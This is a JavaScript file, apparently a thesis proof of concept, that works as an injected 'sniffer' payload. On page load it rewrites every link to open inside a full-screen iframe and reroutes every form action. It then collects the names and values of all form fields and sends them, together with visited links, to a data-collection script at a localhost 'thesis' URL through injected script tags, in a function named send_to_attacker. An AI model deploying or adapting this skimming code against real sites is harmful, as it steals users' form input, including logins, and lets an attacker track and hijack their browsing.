var ajax_request;
var iframe_created = false;
var doc = document;

function load_sniffer()
{
  create_object();
  collect_links();
  collect_forms();
}

function create_object()    {

    if(window.ActiveXObject)     {
        //IE
        // different XMLHTTP versions, make sure most recent come first
  var versions = ["Msxml2.XMLHTTP.7.0", "Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.5.0", "Msxml2.XMLHTTP.4.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"];

        for (var i = 0; i < versions.length ; i++) {
            try {
                // try creating this version, if failed, go to another one
                ajax_request = new ActiveXObject(versions[i]);

                if (ajax_request) {
                    break;
                }
            }catch (objException) {
                // error, try next
            } ;
        }
    }

  //Firefox
    if (!ajax_request && typeof XMLHttpRequest != 'undefined') {
        ajax_request = new XMLHttpRequest ();
    }

}

function loadUrl(link)
{
	send_to_attacker(link);

	if (!iframe_created)
	{
		var ifrm = document.createElement('iframe');

		ifrm.setAttribute("src", link);
		ifrm.setAttribute("frameborder", 0);
		ifrm.setAttribute("scrolling", "no");

		ifrm.style.width = "100%"
		ifrm.style.height = "100%"
		ifrm.style.position = "absolute";
		ifrm.style.top = "0px";
		ifrm.style.left = "0px";
		ifrm.style.background = "#FFFFFF";

		document.body.appendChild(ifrm);

		setTimeout(function() {
			var sc = doc.defaultView.document.createElement("script");
			sc.type="text/javascript";
			sc.src = "sniffer.js";
			doc.defaultView.document.body.appendChild(sc);

			load_sniffer();
		}, 400);

		doc = ifrm.document;
		if(ifrm.contentDocument)
			doc = ifrm.contentDocument; // For NS6
		else if(ifrm.contentWindow)
			doc = iframe.contentWindow.document; // For IE5.5 and IE6
	}
}

function collect_links()
{
	var all_links = doc.defaultView.document.getElementsByTagName("a");
    var total_links = all_links.length;
    for(var i = 0; i < total_links; i++)    {
        all_links[i].href="javascript:loadUrl('" + all_links[i].href + "');";
    }
}

function collect_forms()
{
    var all_forms = doc.defaultView.document.getElementsByTagName("form");
    var total_forms = all_forms.length;
    for(var i = 0; i < total_forms; i++)    {
        all_forms[i].action="javascript:submit_form('" + i + "');";
    }
}

function submit_form(form_id)
{

  var post_url = "";
  var all_forms = doc.getElementsByTagName("form");
  var total_forms = all_forms.length;
  var form;

  for(var i = 0; i < total_forms; i++)   {
	  form = all_forms[i];
	  for(var j = 0; j < form.elements.length; j++)  {
		var line = form.elements[j].name + " = " + form.elements[j].value + "<br>";
		post_url += form.elements[j].name + "=" + form.elements[j].value;
		if(j+1 < form.length)
		  post_url += "&";
	  }
  }

  var attack_string = "submit_url=" + form_id + "&" + post_url;
  send_to_attacker(attack_string);
}

function send_to_attacker(param_url)
{
	var attack_script = "http://localhost/thesis/spying_on_data.php?data=" + escape(param_url); 

    var script = document.createElement('script');
    script.src = attack_script;
    script.type = 'text/javascript';
    document.body.appendChild(script);
}

window.onload = load_sniffer;
